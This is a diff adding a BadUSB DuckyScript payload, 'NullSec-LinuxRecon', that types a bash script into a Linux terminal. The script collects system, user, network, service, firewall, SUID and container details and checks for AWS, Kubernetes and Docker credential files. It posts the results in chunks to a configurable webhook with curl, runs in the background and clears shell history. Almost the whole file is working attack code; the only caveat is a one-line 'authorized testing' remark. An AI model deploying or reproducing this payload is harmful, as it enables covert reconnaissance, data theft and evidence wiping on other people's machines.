@@ -1,0 +1,166 @@
+REM ################################################
+REM # NullSec-LinuxRecon                           #
+REM # Linux System Reconnaissance via BadUSB        #
+REM # Target: Linux (Ubuntu/Debian/Fedora/Arch)     #
+REM # Author: NullSec (github.com/bad-antics)       #
+REM ################################################
+REM
+REM Comprehensive Linux system reconnaissance:
+REM - System info (kernel, distro, arch, uptime)
+REM - Network config (interfaces, routes, DNS, ARP)
+REM - User enumeration (users, groups, sudo, SSH keys)
+REM - Running services and open ports
+REM - Cron jobs and scheduled tasks
+REM - Installed packages (security-relevant)
+REM - Docker/container detection
+REM - SUID/SGID binary enumeration
+REM - Firewall rules
+REM
+REM Exfiltration: Webhook (configure below)
+REM For authorized penetration testing only.
+
+DELAY 1000
+
+REM Open terminal - try multiple methods
+CTRL ALT t
+DELAY 1500
+
+REM === CONFIGURE YOUR WEBHOOK HERE ===
+STRING export WH='YOUR_WEBHOOK_URL'
+ENTER
+DELAY 200
+
+STRING bash -c '(
+ENTER
+STRING R=""
+ENTER
+
+REM --- System Info ---
+STRING R+="=== SYSTEM INFO ===\n"
+ENTER
+STRING R+="Hostname: $(hostname)\n"
+ENTER
+STRING R+="Kernel: $(uname -a)\n"
+ENTER
+STRING R+="Distro: $(cat /etc/os-release 2>/dev/null | grep PRETTY | cut -d= -f2)\n"
+ENTER
+STRING R+="Uptime: $(uptime -p 2>/dev/null || uptime)\n"
+ENTER
+STRING R+="Arch: $(arch)\n"
+ENTER
+STRING R+="CPU: $(grep -m1 "model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2)\n"
+ENTER
+STRING R+="RAM: $(free -h 2>/dev/null | awk "/Mem:/{print \$2}")\n"
+ENTER
+STRING R+="Disk: $(df -h / 2>/dev/null | awk "NR==2{print \$2,\$5}")\n\n"
+ENTER
+
+REM --- Current User ---
+STRING R+="=== USER INFO ===\n"
+ENTER
+STRING R+="User: $(whoami)\n"
+ENTER
+STRING R+="UID: $(id)\n"
+ENTER
+STRING R+="Groups: $(groups)\n"
+ENTER
+STRING R+="Sudo: $(sudo -n -l 2>/dev/null | head -5 || echo "requires password")\n"
+ENTER
+STRING R+="Home: $(ls -la ~ 2>/dev/null | head -5)\n"
+ENTER
+STRING R+="Shell: $SHELL\n"
+ENTER
+STRING R+="SSH Keys: $(ls ~/.ssh/ 2>/dev/null | tr "\n" " " || echo "none")\n\n"
+ENTER
+
+REM --- Other Users ---
+STRING R+="=== ALL USERS (shell access) ===\n"
+ENTER
+STRING R+="$(grep -v nologin /etc/passwd 2>/dev/null | grep -v false | cut -d: -f1,3,6)\n\n"
+ENTER
+
+REM --- Network ---
+STRING R+="=== NETWORK ===\n"
+ENTER
+STRING R+="$(ip -4 addr show 2>/dev/null | grep -E "inet |^[0-9]" || ifconfig 2>/dev/null | grep -E "inet |^[a-z]")\n"
+ENTER
+STRING R+="Gateway: $(ip route show default 2>/dev/null | awk "{print \$3}")\n"
+ENTER
+STRING R+="DNS: $(cat /etc/resolv.conf 2>/dev/null | grep nameserver | awk "{print \$2}" | tr "\n" " ")\n"
+ENTER
+STRING R+="ARP: $(arp -n 2>/dev/null | grep -v Address | head -10)\n\n"
+ENTER
+
+REM --- Listening Ports ---
+STRING R+="=== LISTENING PORTS ===\n"
+ENTER
+STRING R+="$(ss -tulnp 2>/dev/null | head -20 || netstat -tulnp 2>/dev/null | head -20)\n\n"
+ENTER
+
+REM --- Services ---
+STRING R+="=== RUNNING SERVICES ===\n"
+ENTER
+STRING R+="$(systemctl list-units --type=service --state=running 2>/dev/null | head -20 || service --status-all 2>/dev/null | grep + | head -20)\n\n"
+ENTER
+
+REM --- Cron ---
+STRING R+="=== CRON JOBS ===\n"
+ENTER
+STRING R+="$(crontab -l 2>/dev/null || echo "no user crontab")\n"
+ENTER
+STRING R+="System cron: $(ls /etc/cron.d/ 2>/dev/null | tr "\n" " ")\n\n"
+ENTER
+
+REM --- Security ---
+STRING R+="=== SECURITY ===\n"
+ENTER
+STRING R+="Firewall (iptables): $(iptables -L -n 2>/dev/null | head -10 || echo "no access")\n"
+ENTER
+STRING R+="Firewall (ufw): $(ufw status 2>/dev/null || echo "not installed")\n"
+ENTER
+STRING R+="SELinux: $(getenforce 2>/dev/null || echo "not installed")\n"
+ENTER
+STRING R+="AppArmor: $(aa-status 2>/dev/null | head -3 || echo "not installed")\n\n"
+ENTER
+
+REM --- SUID Binaries ---
+STRING R+="=== SUID BINARIES ===\n"
+ENTER
+STRING R+="$(find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null | head -15)\n\n"
+ENTER
+
+REM --- Docker ---
+STRING R+="=== CONTAINERS ===\n"
+ENTER
+STRING R+="Docker: $(docker ps 2>/dev/null | head -10 || echo "not available")\n"
+ENTER
+STRING R+="Podman: $(podman ps 2>/dev/null | head -5 || echo "not available")\n\n"
+ENTER
+
+REM --- Interesting Files ---
+STRING R+="=== INTERESTING FILES ===\n"
+ENTER
+STRING R+="Bash history: $(wc -l < ~/.bash_history 2>/dev/null || echo 0) lines\n"
+ENTER
+STRING R+="AWS: $(test -f ~/.aws/credentials && echo "FOUND" || echo "none")\n"
+ENTER
+STRING R+="Kube: $(test -f ~/.kube/config && echo "FOUND" || echo "none")\n"
+ENTER
+STRING R+="Docker: $(test -f ~/.docker/config.json && echo "FOUND" || echo "none")\n"
+ENTER
+
+REM --- Exfiltrate ---
+STRING printf "%s" "$R" | fold -w 1900 | while IFS= read -r chunk; do
+ENTER
+STRING curl -s -X POST "$WH" -H "Content-Type: application/json" -d "{\"content\":\"\`\`\`$chunk\`\`\`\"}" 2>/dev/null
+ENTER
+STRING sleep 1; done
+ENTER
+
+REM --- Cleanup ---
+STRING history -c; unset WH R
+ENTER
+STRING ) &>/dev/null &'
+ENTER
+STRING exit
+ENTER
